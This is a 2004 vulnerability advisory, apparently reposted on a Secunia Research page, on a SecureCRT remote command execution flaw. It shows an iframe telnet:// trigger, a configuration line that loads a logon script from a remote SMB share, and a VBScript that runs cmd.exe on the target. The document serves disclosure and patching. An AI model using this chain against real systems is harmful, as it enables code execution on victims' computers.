= SecureCRT - Remote Command Execution
=
= Vendor Update:
= <http://www.vandyke.com/download/securecrt/index.html>
=
= Affected Software:
=       SecureCRT V4.1, V4.0 (and probably lower)
=
= Public disclosure on November 23, 2004
========================================================================

== Overview ==

In this time of responsible vulnerability disclosure, it's a little
disturbing when a vendor acts on disclosed information but gives no
recognition or even notification that an update has been created due to
the information passed to them.

This advisory is a little late, the update was posted to the vendor
website last month. The only reason I know this, is because I asked and
received a response.
------------------------------------------------------------------------

Brett,

SecureCRT version 4.1.9 was released on Oct. 26, and is
available for public download at the following location:

    <http://www.vandyke.com/download/securecrt/index.html>

My apologies for not sending a special notice to you upon
release. It was something that slipped off my radar.

If you have any questions, please let us know.

Thanks,
Jake Devenport

------------------------------------------------------------------------

But enough of that, we know the game and still choose to play.

SecureCRT installs a URL PROTOCOL handler into the registry, as
"C:\Program Files\SecureCRT\SecureCRT.EXE" %1

This allows a user to click on a telnet:// link and have it opened from
within their web browser.

This 'telnet execution' can be automated through an html page such as
<iframe src="telnet://192.168.0.1:25">

SecureCRT will accept a command line option (/F) to specify the directory
to use as the configuration folder. It is possible by crafting a special
URL to specify this directory through the html page. An attacker can
specify a directory accessible through unprotected SMB share, therefore
allowing them to control the configuration of secureCRT.

SecureCRT allows for 'scripting' using script languages such as vbscript
and has the ability to create a logon script. An attacker can therefore
create a script to execute commands and have these commands executed on
the targets computer.

== Exploitation ==

There appears to be some filtering around the use of \ in the url->command
line parsing, that appeared to prevent the specification of an SMB share
to use for the configuration. This can be easily bypassed and leads to the
loading of a configuration file from a remote site.

The configuration file contains an entry that specifies the login script
to run which can be set a file on the the remote share;

S:"Script Filename"=\\ipofshare\share\folder\scriptname

And the login script can then contain scripting such as;

# $language = "VBScript"
# $interface = "1.0"

Sub Main
  dim wshShell, boolErr, strErrDesc
  Set wshShell = CreateObject("WScript.Shell")
  run = wshShell.Run ("cmd.exe /c dir >c:\shell.txt",0,True)
End Sub

== Solutions ==

- Install the vendor supplied patch.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
